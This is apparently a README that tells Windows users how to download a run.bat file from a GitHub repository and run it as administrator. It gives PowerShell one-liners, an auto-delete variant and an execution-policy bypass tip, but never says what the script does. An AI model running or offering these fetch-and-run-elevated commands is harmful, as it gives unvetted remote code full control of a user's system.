# How to Run run.bat as Administrator

This guide shows you how to download and execute the `run.bat` file from this repository with administrator privileges.

## Prerequisites

- Windows operating system
- PowerShell (comes pre-installed on Windows 10/11)
- Administrator access to your computer

## Quick Start (Recommended)

### Option 1: PowerShell One-Liner
1. **Right-click** on the Start button and select **"Windows PowerShell"** or **"Terminal"**
2. Copy and paste this command:
```powershell
iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
```
3. Press **Enter**
4. When prompted by UAC (User Access Control), click **"Yes"** to allow administrator access

### Option 2: Step-by-Step Method
1. **Open PowerShell**:
   - Right-click Start button → **"Windows PowerShell"** or **"Terminal"**

2. **Download the file**:
```powershell
iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"
```

3. **Run as Administrator**:
```powershell
Start-Process "run.bat" -Verb RunAs
```

4. **Confirm UAC prompt** by clicking **"Yes"**

## Alternative Methods

### Method 3: Command Prompt
1. **Open Command Prompt** (Win + R → type `cmd` → Enter)
2. Run this command:
```cmd
powershell -Command "iwr -UseBasicParsing 'https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs"
```

### Method 4: With Auto-Cleanup
If you want the batch file to be automatically deleted after running:
```powershell
iwr -UseBasicParsing "https://raw.githubusercontent.com/09sychic/sqd5/refs/heads/main/run.bat" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
```

## Troubleshooting

### "Execution policy" error
If you get an execution policy error, run this first:
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

### Internet connection issues
- Make sure you have an active internet connection
- Check if your firewall or antivirus is blocking the download
- Try running PowerShell as Administrator first

### UAC (User Access Control) not appearing
- Make sure you're not already running as Administrator
- Check your UAC settings in Windows Security settings

## Security Notice

⚠️ **Important**: Only run batch files from trusted sources. This script will execute with administrator privileges, which means it has full access to your system. Make sure you trust the source before proceeding.

## What Happens Next?

After running the command:
1. The `run.bat` file will be downloaded to your current directory
2. A UAC prompt will appear asking for administrator permission
3. Click "Yes" to proceed
4. The batch file will execute with administrator privileges
5. Follow any additional prompts or instructions that appear

## Need Help?

If you encounter any issues:
1. Make sure you have administrator rights on your computer
2. Check your internet connection
3. Verify that Windows Defender or antivirus isn't blocking the download
4. Try running PowerShell as Administrator first

---

*Last updated: September 2025*
